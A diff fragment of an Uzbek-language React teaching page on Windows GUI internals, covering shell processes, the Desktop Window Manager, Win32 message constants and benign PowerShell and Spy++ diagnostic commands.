-Asosiy Jarayonlar:
-  explorer.exe       Shell, fayl menejeri, ish stoli/vazifalar paneli
-  dwm.exe            DWM compositor (barcha vizual rendering)
-  sihost.exe         Shell Infratuzilma Hosti (Start Menu qo'llab-quvvatlash)
-  StartMenuExperienceHost.exe  WinUI Start Menu
-  SearchHost.exe     Qidiruv UI (Cortana o'rnini bosuvchi)
-  RuntimeBroker.exe  UWP ilovalar uchun ruxsat brokeri`}</code></pre>
 
       <H2 num="§4" uz="DWM — Ish stoli Oyna Menejeri" en="" />
       <P><Term>DWM (Desktop Window Manager)</Term> — Windows Vista da kiritilgan compositor jarayoni (dwm.exe). Ilovalar to'g'ridan-to'g'ri ekranga chizish o'rniga, har bir oyna ekran tashqarisidagi Direct3D yuzasiga render qiladi. DWM barcha yuzalarni kompozit qiladi va yakuniy kadrni displeyga yuboradi — shaffoflik (Aero Glass), animatsiyalar, miniatyura oldinko'rishlari, HDR va monitor-DPI masshtablab ko'rsatishni ta'minlaydi.</P>
@@ -10726,28 +8621,6 @@ Asosiy Jarayonlar:
       </div>
 
       <H2 num="§6" uz="Win32 Xabarlari — Asosiy WM_ Konstantalari" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.9,overflowX:"auto",marginTop:10}}><code>{`// Kirish xabarlari
-WM_KEYDOWN / WM_KEYUP     0x0100 / 0x0101   Tugma bosildi/qo'yib yuborildi
-WM_CHAR                   0x0102            Tarjima qilingan belgi (TranslateMessage() dan keyin)
-WM_LBUTTONDOWN            0x0201            Chap sichqoncha tugmasi bosildi (lParam da kursor pozitsiyasi)
-WM_RBUTTONDOWN            0x0204            O'ng sichqoncha tugmasi bosildi
-WM_MOUSEMOVE              0x0200            Sichqoncha ko'chdi (lParam da kursor pozitsiyasi)
-WM_MOUSEWHEEL             0x020A            Sichqoncha g'ildiragi (HIWORD(wParam) da delta)
-
-// Oyna hayot tsikli
-WM_CREATE                 0x0001            Oyna yaratildi (lParam da CREATESTRUCT*)
-WM_DESTROY                0x0002            Oyna yo'q qilindi — bu yerda WM_QUIT yuborish
-WM_CLOSE                  0x0010            Foydalanuvchi X ni bosdi — "Saqlashmi?" dialog uchun ushlash mumkin
-WM_QUIT                   0x0012            Xabar tsiklini tugatadi (GetMessage 0 qaytaradi)
-WM_SIZE                   0x0005            Oyna o'lchami o'zgardi (lParam da yangi o'lcham)
-WM_PAINT                  0x000F            Oynani qayta chizish kerak (BeginPaint/EndPaint ishlating)
-
-// Tizim xabarlari
-WM_TIMER                  0x0113            Taymer ishga tushdi (wParam da SetTimer ID)
-WM_COMMAND                0x0111            Menyu elementi / tugma bosildi (wParam da boshqaruv ID)
-WM_NOTIFY                 0x004E            Umumiy boshqaruv bildirishnomasi (lParam da NMHDR*)
-WM_COPYDATA               0x004A            Jarayonlararo ma'lumot uzatish (COPYDATASTRUCT*)
-WM_HOTKEY                 0x0312            RegisterHotKey() bilan ro'yxatdan o'tgan tizimiy shortcut`}</code></pre>
 
       <H2 num="§7" uz="GUI Xavfsizligi — Hujum Vektorlari" en="" />
       <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
@@ -10769,33 +8642,6 @@ WM_HOTKEY                 0x0312            RegisterHotKey() bilan ro'yxatdan o'
       </Callout>
 
       <H2 num="§8" uz="Amaliy Buyruqlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Oynalarni sanab chiqish (PowerShell)
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.Screen]::AllScreens           # monitor joylashuvi
-
-# Sarlavha bo'yicha oynani topish (.NET)
-Add-Type @"
-using System; using System.Runtime.InteropServices;
-public class Win32 {
-  [DllImport("user32.dll")] public static extern IntPtr FindWindow(string cls, string title);
-}
-"@
-[Win32]::FindWindow($null, "Bloknot")               # Bloknot oynasining HWND si
-
-# DWM diagnostikasi
-Get-Process dwm                                     # DWM jarayoni ma'lumoti
-winver                                              # OS versiyasi (DWM imkoniyatlariga ta'sir qiladi)
-
-# UI spy vositalari
-Spy++ (spyxx.exe)                                   # VS: oynalar, xabarlar, sinflarni sanab chiqish
-Accessibility Insights                              # UIA daraxt ko'ruvchisi (bepul, Microsoft)
-inspect.exe (Windows SDK)                           # UIA element inspektori
-
-# Jarayon yaxlitlik darajasini tekshirish
-whoami /groups | findstr "Integrity"               # joriy jarayon IL
-
-# Oyna sarlavhalari bilan ishlaydigan jarayonlar
-Get-Process | Where {$_.MainWindowTitle -ne ""} | Select Name,Id,MainWindowTitle`}</code></pre>
     </section>
   );
 }
